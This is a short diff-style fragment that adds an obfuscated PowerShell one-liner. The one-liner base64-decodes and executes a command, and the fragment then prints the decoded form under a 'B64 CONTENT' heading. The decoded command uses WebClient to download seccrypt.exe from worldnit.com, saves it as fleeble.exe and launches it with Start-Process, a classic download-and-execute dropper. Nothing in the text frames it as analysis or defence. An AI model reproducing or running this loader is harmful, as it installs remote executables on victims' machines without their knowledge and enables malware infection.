@@ -1,0 +1,7 @@
+iex([sYSteM.tExt.enCOdiNG]::UTf8.gEtstring([syStEM.COnvErT]::FRoMBASE64StRING('CihOZXctT2JqZWN0IFNZU1RFbS5uRXQud2ViQ2xJRU50KS5kb1duTG9hRGZpbEUoJ2h0dHA6Ly93b3JsZG5pdC5jb20vc2VjY3J5cHQuZXhlJywnZmxlZWJsZS5leGUnKTtTdGFydC1Qcm9jZXNzICdmbGVlYmxlLmV4ZScKCg==')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object SYSTEm.nEt.webClIENt).doWnLoaDfilE('http://worldnit.com/seccrypt.exe','fleeble.exe');Start-Process 'fleeble.exe'
+
